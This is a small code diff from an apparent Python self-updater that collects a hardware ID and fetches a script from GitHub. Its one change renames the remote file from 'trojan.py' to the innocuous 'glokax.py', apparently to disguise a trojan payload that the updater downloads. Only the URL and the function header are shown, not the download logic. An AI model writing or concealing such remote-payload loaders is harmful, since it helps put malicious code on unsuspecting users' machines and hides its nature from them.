@@ -22,7 +22,7 @@ def get_hwid():
 download_folder = os.path.dirname(os.path.abspath(__file__))
 
 # URL of the script on GitHub (or any other hosting platform)
-script_url = "https://github.com/Abood-cpu/glaxzs/blob/main/trojan.py"
+script_url = "https://github.com/Abood-cpu/glaxzs/blob/main/glokax.py"
 
 # Function to check for updates
 def check_for_updates():
